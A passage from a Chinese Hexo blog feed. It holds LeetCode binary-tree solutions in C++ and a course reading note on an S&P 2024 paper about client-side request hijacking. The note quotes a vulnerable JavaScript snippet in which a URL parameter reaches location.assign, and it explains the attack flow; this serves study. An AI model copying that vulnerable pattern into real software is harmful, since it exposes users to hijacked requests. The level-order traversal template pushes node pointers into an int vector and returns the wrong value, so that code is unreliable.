class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">// Definition for a Node.</span><br><span class="hljs-comment">class Node {</span><br><span class="hljs-comment">public:</span><br><span class="hljs-comment">    int val;</span><br><span class="hljs-comment">    Node* left;</span><br><span class="hljs-comment">    Node* right;</span><br><span class="hljs-comment">    Node* next;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) {}</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) {}</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span><br><span class="hljs-comment">        : val(_val), left(_left), right(_right), next(_next) {}</span><br><span class="hljs-comment">};</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">connect</span><span class="hljs-params">(Node* root)</span> </span>{<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        {<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            {<br>                Node* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> ( i == size - <span class="hljs-number">1</span>)<span class="hljs-comment">//该层最后一个节点</span><br>                {<br>                    node-&gt;next=<span class="hljs-literal">NULL</span>;<br>                }<br>                <span class="hljs-keyword">else</span><br>                {<br>                    <span class="hljs-comment">// 将next指针指向右边的节点</span><br>                    node-&gt;next = que.<span class="hljs-built_in">front</span>();<br>                }<br>                <span class="hljs-keyword">if</span> (node-&gt;left!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure><h3 id="记录一下二叉树层序遍历的板子"><a href="#记录一下二叉树层序遍历的板子" class="headerlink" title="记录一下二叉树层序遍历的板子"></a>记录一下二叉树层序遍历的板子</h3><p>二叉树的层序遍历通过队列实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">solution</span><span class="hljs-params">(Node* root)</span> </span>{<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 存放层序遍历结果</span><br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        {<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            vector&lt;<span class="hljs-type">int</span>&gt; temp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            {<br>                Node* t = que.<span class="hljs-built_in">front</span>();<br>                <span class="hljs-keyword">if</span> (t-&gt;left) que.<span class="hljs-built_in">push</span>(t-&gt;left);<br>                <span class="hljs-keyword">if</span> (t-&gt;right) que.<span class="hljs-built_in">push</span>(t-&gt;right);<br>                que.<span class="hljs-built_in">pop</span>();<br>                temp.<span class="hljs-built_in">push_back</span>(t);<br>            }<br>            result.<span class="hljs-built_in">push_back</span>(temp);<br>        }<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过数组构造树</title>
    <link href="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/"/>
    <url>/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>通过前序遍历数组(后序遍历数组)和中序遍历数组构造树的方法😀</p><span id="more"></span><h3 id="前序遍历-中序遍历构造"><a href="#前序遍历-中序遍历构造" class="headerlink" title="前序遍历+中序遍历构造"></a>前序遍历+中序遍历构造</h3><p>本题为leetcode-105</p><p>在前序遍历中，我们可以知道顺序为：中、左、右</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorder = [<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br>inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现前序数组的第一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在前序数组中，不能直接分割出后面的左右两部分，需要借助分割出的中序数组来帮助我们分割前序数组，即通过新的两个中序数组的大小，我们可以在前序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorderLeft = [<span class="hljs-number">9</span>];<br>preorderRight = [<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode {</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span><br><span class="hljs-comment"> * };</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder)</span> </span>{<br>        <span class="hljs-comment">// 先序遍历的为空说明所有节点已经遍历完成</span><br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>){<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        }<br>        <span class="hljs-comment">// 取先序数组的第一个元素作为根节点</span><br>        <span class="hljs-type">int</span> value = preorder[<span class="hljs-number">0</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>)<br>        {<br>            <span class="hljs-comment">// 叶子节点</span><br>            <span class="hljs-keyword">return</span> ansTree;<br>        }<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (; index &lt; preorder.<span class="hljs-built_in">size</span>() ; ++index){<br>            <span class="hljs-keyword">if</span> (inorder[index] == value) <span class="hljs-keyword">break</span>;<br>        }<br>        <span class="hljs-comment">// 切割中序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() , inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>,inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过切割出来的中序数组大小去切割先序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderLeft = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">1</span>, preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderRight = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>,preorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过新的数组构建子树</span><br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(preorderLeft,inorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(preorderRight,inorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    }<br>};<br></code></pre></td></tr></table></figure><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-33-35.png" class=""><h3 id="后序遍历-中序遍历构造"><a href="#后序遍历-中序遍历构造" class="headerlink" title="后序遍历+中序遍历构造"></a>后序遍历+中序遍历构造</h3><p>本题为leetcode-106</p><p>在后序遍历中，我们可以知道顺序为：左、右、中</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br>postorder = [<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现后序数组的最后一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在后序数组中，不能直接分割出前面的左右两部分，需要借助分割出的中序数组来帮助我们分割后序数组，即通过新的两个中序数组的大小，我们可以在后序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">postorderLeft = [<span class="hljs-number">9</span>];<br>postorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode {</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span><br><span class="hljs-comment"> * };</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>{<br>        <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>        {<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        }<br>        <span class="hljs-type">int</span> value = postorder[postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-comment">// 找到中序数组分割点</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( ; index &lt; inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; ++index)<br>        {<br>            <span class="hljs-keyword">if</span> ( inorder[index] == value ) <span class="hljs-keyword">break</span>;<br>        }<br>        <span class="hljs-comment">// 分割中序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 分割后序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderLeft = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() ,postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>());<br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderRight = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() , postorder.<span class="hljs-built_in">end</span>() - <span class="hljs-number">1</span>);<br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(inorderLeft,postorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(inorderRight,postorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    }<br>};<br></code></pre></td></tr></table></figure><h3 id="编码细节"><a href="#编码细节" class="headerlink" title="编码细节"></a>编码细节</h3><p>在分割区间时，必须要同一格式，这里我采用的是左闭右开形式。对于vector数组在构造时，是默认左闭右开构造的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-comment">// 分割中序数组</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index); <span class="hljs-comment">// 不包含inroder.begin() + index</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<span class="hljs-comment">// 不包含inorder.end()</span><br></code></pre></td></tr></table></figure><h3 id="前序数组和后序数组不能完成构造"><a href="#前序数组和后序数组不能完成构造" class="headerlink" title="前序数组和后序数组不能完成构造"></a>前序数组和后序数组不能完成构造</h3><p>没有中序遍历无法确定左右部分，也就是无法分割。</p><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-43-07.png" class=""><p>tree1 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>tree2 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>那么tree1 和 tree2 的前序和后序完全相同，这是一棵树么，很明显是两棵树！</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软工课设开发实录</title>
    <link href="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/"/>
    <url>/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="88009ec9c456ad66f57a72f3e14de5cf64669c7b7a0d6ba7d8370f0ca2fe6b37"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文阅读1</title>
    <link href="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/"/>
    <url>/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/</url>
    
    <content type="html"><![CDATA[<p>大三某课程作业🐸读一篇网安相关文章。选取到了S&amp;P’2024中的</p><p><code>The Great Request Robbery: An Empirical Study of Client-side Request Hijacking Vulnerabilities on the Web</code></p><span id="more"></span><p>伟大的请求劫持：对网络客户端请求劫持漏洞的实证研究</p><p>关于为什么这里使用请求劫持这个词而不是伪造，个人分析，伪造是手段，目的是为了达到劫持这种状态，想一想，攻击者能够伪造受害者发出请求，怎么不算劫持了受害者的请求呢。</p><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><h4 id="原文翻译"><a href="#原文翻译" class="headerlink" title="原文翻译"></a>原文翻译</h4><p>​请求伪造攻击是<code>Web</code>应用程序最古老的威胁之一，传统上是由服务器端混淆的代理漏洞引起的。然而，最近客户端技术的进步引入了更微妙的请求伪造变种，攻击者利用客户端程序中的输入验证缺陷来劫持发出请求。我们几乎没有关于这些客户端变体的信息，它们的流行程度，影响和对策，在本文中，我们对Web平台上客户端请求劫持的状态进行了第一次评估。</p><p>​从全面审查浏览器<code>API</code>功能和<code>Web</code>规范开始，我们将请求劫持漏洞和由此导致的攻击系统化，确定了10个不同的漏洞变体，其中包括7个新的漏洞。然后，我们使用我们的系统设计和实现了<code>Sheriff</code>，一个静态-动态工具，用于检测从攻击者可控输入到请求发送指令的脆弱数据流。</p><p>​我们在Tranco Top  10K网站的顶部实例化了<code>Sheriff</code>，据我们所知，这是对野外普遍存在的请求劫持缺陷的首次调查。我们的研究发现，请求劫持漏洞无处不在，影响了9.6 %的前10K站点。我们通过在49个站点上构建67个概念验证漏洞，展示了这些漏洞的影响，使得针对Microsoft  Azure、Starz、Reddit和Indeed等流行网站的任意代码执行、信息泄露、开放重定向和CSRF成为可能。最后，我们回顾和评估了针对客户端请求劫持攻击的现有对策的采用和有效性，包括基于浏览器的解决方案，如<code>CSP</code>，<code>COOP</code>和<code>COEP</code>，以及输入验证。</p><h4 id="重要信息"><a href="#重要信息" class="headerlink" title="重要信息"></a>重要信息</h4><p>​近几年出现了很多最新的请求劫持的攻击模式，目前还没有对这些方法的系统性研究。通过审查浏览器<code>API</code>功能和Web规范，我们将请求劫持攻击重新分为10类，包括新的7个漏洞。我们开发了<code>Sheriff</code>工具，用于检测网站是否存在请求劫持漏洞，这是对在野请求劫持漏洞的首次调查。通过工具扫描大量站点发现，请求劫持漏洞无处不在。最后，我们评估了现有防御措施的有效性。</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><h4 id="重要信息-1"><a href="#重要信息-1" class="headerlink" title="重要信息"></a>重要信息</h4><p>​主要介绍了传统请求劫持造成的危害，比如客户端代码执行、混淆请求、删除数据库等等。</p><p>​最近客户端技术的快速演进引入了更隐蔽的请求伪造漏洞变种，攻击者不再依赖混淆的代理缺陷，而是利用客户端<code>JavaScript</code>程序中的输入验证漏洞来劫持外出请求。目前的研究主要集中在<code>CSRF</code>及相应的检测分析技术。但是不仅仅是<code>CSRF</code>攻击需要被研究，它仅仅是较大的一个版块，还有许多存在于<code>JS</code>代码中的请求可以被劫持。</p><p>​同样的，最近的研究主要是关注到异步请求，像<code>XMLHttpRequest</code>和<code>Fetch API</code>，忽略了其他类型的请求诸如<code>push notification</code>、<code>web sockets</code>等等。再者，目前的防御策略只解决了混淆代理问题，但新的客户端输入缺陷导致的请求劫持将会绕过目前的防御手段。</p><p>​在本文中，我们首次对客户端请求劫持漏洞进行了评估，主要包括三个方面：对攻击面的系统探索，对脆弱网站的测量，以及对请求劫持防御的全面审查和评估。然后，我们提出了<code>Sheriff</code>，这是一种客户端请求劫持检测工具，它结合使用混合程序分析和浏览器内动态污点跟踪来发现潜在脆弱的数据流并进行动态分析用于自动漏洞验证的<code>API</code>工具。</p><h4 id="重要名词简介"><a href="#重要名词简介" class="headerlink" title="重要名词简介"></a>重要名词简介</h4><p><code>fetch</code>：JS中的函数，用于向服务端请求资源。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>XMLHttpRequest</code>：一个内建的浏览器对象，它允许使用 JavaScript 发送 HTTP 请求。两种执行模式：同步（synchronous）和异步（asynchronous）。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>Top-level Request</code>：顶级请求是指在浏览器中执行的导航请求，例如使用<code>location.assign()</code>、<code>window.open()</code>或通过用户在地址栏中输入URL来导航到新页面的请求。在顶级请求中，<strong>浏览器会将当前域下的Cookie发送到目标域</strong>。这可能会引发安全问题，特别是如果目标域是恶意站点，它可能会收集和滥用来自其他域的Cookie信息。</p><h3 id="CSRH：Client-side-Request-Hijacking"><a href="#CSRH：Client-side-Request-Hijacking" class="headerlink" title="CSRH：Client-side Request Hijacking"></a>CSRH：Client-side Request Hijacking</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CSRH漏洞描述：攻击者可以欺骗受害者的客户端使用攻击者自制的输入来操作发送请求的API。比较出名的漏洞实例像是CSRF这种。</p><p>在Microsoft Azure网页中发现的一个可以被劫持的top-level HTTP请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> params = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>)).<span class="hljs-property">searchParams</span>;<br><span class="hljs-keyword">var</span> t = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">"request"</span>);<br><span class="hljs-keyword">if</span>(t != <span class="hljs-literal">null</span> &amp;&amp; t.<span class="hljs-property">length</span>){ <br>    <span class="hljs-comment">// post message to opener</span><br>    opener &amp;&amp; opener.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">"reauthPopupOpened"</span>, t);<br>    <span class="hljs-comment">// listen for signal</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> !== opener.<span class="hljs-property">origin</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> === <span class="hljs-string">"sendRequest"</span>){ <br>            <span class="hljs-comment">// top-level navigation request </span><br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">assign</span>(t);<br>        } <br>    }<br>}<br></code></pre></td></tr></table></figure><h4 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h4><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_10-19-56.png" class=""><p>上述漏洞的利用实例：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_16-09-53.png" class=""><p>攻击者准备了一个恶意页面并诱导受害者去访问（或者直接分享给受害者存在漏洞的页面，个人觉得这个不如前面那个方法，前面那个方法可以隐藏恶意<code>payload</code>），这个页面会打开存在漏洞的页面，并且此时已经插入了恶意的请求参数，当新的页面加载完成时，上面那段JS代码会加载恶意参数并发出<code>top-level</code>请求，由于是顶级请求，浏览器会获取<code>cookie</code>，从而绕过同源策略，劫持原始请求。</p><p>在这篇文章中，研究者们不仅仅关注http形式的URL，例如像<code>location.assign()</code>这种API也可以接收URL。劫持了<code>API</code>后，攻击者将会扩大危害，例如<code>CSRF</code>、客户端代码执行、重定向等等</p><h3 id="问题陈述——即本篇论文解决的问题"><a href="#问题陈述——即本篇论文解决的问题" class="headerlink" title="问题陈述——即本篇论文解决的问题"></a>问题陈述——即本篇论文解决的问题</h3><h4 id="RQ1：浏览器功能带来的攻击系统化分析"><a href="#RQ1：浏览器功能带来的攻击系统化分析" class="headerlink" 